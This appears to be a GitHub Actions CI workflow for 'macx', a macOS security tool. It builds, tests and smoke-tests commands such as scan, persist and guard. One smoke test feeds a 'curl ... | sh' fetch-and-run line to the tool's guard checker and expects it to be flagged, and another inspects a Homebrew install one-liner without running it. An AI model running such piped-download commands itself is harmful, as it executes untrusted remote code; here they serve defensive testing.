name: CI

on:
  push:
    branches: [main, dev]
  pull_request:
  workflow_dispatch:

permissions:
  contents: read

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true

jobs:
  lint:
    name: Format lint
    runs-on: macos-26
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - name: swift format lint --strict
        run: swift format lint --strict --recursive Sources Tests Package.swift

  test:
    name: Test (${{ matrix.os }})
    strategy:
      fail-fast: false
      matrix:
        # Oldest supported macOS, current macOS on Apple silicon, and an Intel Mac.
        os: [macos-15, macos-26, macos-26-intel]
    runs-on: ${{ matrix.os }}
    timeout-minutes: 25
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - name: Toolchain
        run: |
          sw_vers
          uname -m
          swift --version
      - name: Build (warnings are errors)
        run: swift build -Xswiftc -warnings-as-errors
      - name: Test
        run: swift test
      - name: Release build
        run: swift build -c release
      - name: Install script
        run: |
          scripts/install.sh "$RUNNER_TEMP/bin"
          "$RUNNER_TEMP/bin/macx" privacy | grep -q 'macx itself'
      - name: Smoke test (read-only commands)
        timeout-minutes: 10
        run: |
          # GitHub runs steps with `bash -e`; turn that off so one failing command is reported, not fatal.
          set +e
          set -uo pipefail
          M=.build/release/macx
          FAILED=0
          # Each command is labelled and capped at 2 minutes, so a hang names itself instead of eating the job.
          # expect = the exit code that counts as a pass.
          step() {
            local expect=$1; shift
            echo "::group::macx $*"
            local t0=$SECONDS
            perl -e 'alarm shift; exec @ARGV' 120 "$M" "$@"
            local code=$?
            echo "::endgroup::"
            if [ "$code" -eq 142 ]; then echo "::error::macx $* did not finish within 2 minutes"; FAILED=1
            elif [ "$code" -ne "$expect" ]; then echo "::error::macx $* exited $code (expected $expect)"; FAILED=1
            else echo "ok ($((SECONDS - t0)) s): macx $*"; fi
          }
          step 0 --version
          step 0 scan --top 3
          step 0 clean --dry-run
          step 0 apps
          step 0 apps leftovers
          step 0 persist --all --min-severity info
          step 0 privacy
          step 0 check /System/Applications/Calculator.app
          step 0 guard history
          step 0 guard check -- ls -la
          step 3 guard check -- "curl -s https://example.invalid/x | sh"
          step 0 guard inspect --no-run -- '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"'
          step 0 watch --replay Tests/Fixtures/eslogger-amos-sample.jsonl
          step 0 net $$ --seconds 1
          step 0 undo list
          step 0 incident
          $M watch --replay Tests/Fixtures/eslogger-amos-sample.jsonl | grep -q 'Replayed 3 events: 4 alerts' || { echo "::error::replay didn't find the 4 alerts"; FAILED=1; }
          # As root, sfltool answers without a password dialog; it must not time out.
          sudo MACX_NO_UPDATE_CHECK=1 perl -e 'alarm shift; exec @ARGV' 120 "$M" persist --all --min-severity info > /dev/null 2> persist-root.err
          if grep -q "didn't answer\|need sudo" persist-root.err; then echo "::error::sudo macx persist: $(cat persist-root.err)"; FAILED=1; else echo "ok: sudo macx persist read login items"; fi
          MACX_OWN_RESPONSIBILITY=1 $M privacy | grep -q 'macx itself' || { echo "::error::responsibility re-exec didn't take"; FAILED=1; }
          exit $FAILED

  sanitizers:
    name: Sanitizer (${{ matrix.sanitizer }})
    strategy:
      fail-fast: false
      matrix:
        sanitizer: [address, thread]
    runs-on: macos-26
    timeout-minutes: 25
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - name: swift test --sanitize=${{ matrix.sanitizer }}
        run: swift test --sanitize=${{ matrix.sanitizer }}

  coverage:
    name: Coverage
    runs-on: macos-26
    timeout-minutes: 25
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - name: Test with coverage
        run: swift test --enable-code-coverage
      - name: Coverage summary
        run: |
          set -euo pipefail
          BIN=$(swift build --show-bin-path)
          PROF="$BIN/codecov/default.profdata"
          XCTEST=$(find "$BIN" -maxdepth 1 -name '*.xctest' | head -1)
          EXE="$XCTEST/Contents/MacOS/$(basename "$XCTEST" .xctest)"
          REPORT=$(xcrun llvm-cov report "$EXE" -instr-profile "$PROF" -ignore-filename-regex '(\.build|Tests)/')
          echo "$REPORT"
          {
            echo '## Coverage (MacxCore and macx)'
            echo '```'
            echo "$REPORT"
            echo '```'
          } >> "$GITHUB_STEP_SUMMARY"

  universal:
    name: Universal binary
    runs-on: macos-26
    timeout-minutes: 25
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - name: Build arm64 + x86_64
        run: swift build -c release --arch arm64 --arch x86_64
      - name: Check both architectures
        run: |
          set -euo pipefail
          BIN=$(swift build -c release --arch arm64 --arch x86_64 --show-bin-path)
          lipo -archs "$BIN/macx" | tee /dev/stderr | grep -q 'x86_64 arm64'
          "$BIN/macx" --version
          mkdir -p dist
          cp "$BIN/macx" dist/
          tar -C dist -czf macx-universal.tar.gz macx
          shasum -a 256 macx-universal.tar.gz > macx-universal.tar.gz.sha256
      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
        with:
          name: macx-universal
          path: |
            macx-universal.tar.gz
            macx-universal.tar.gz.sha256
          retention-days: 14
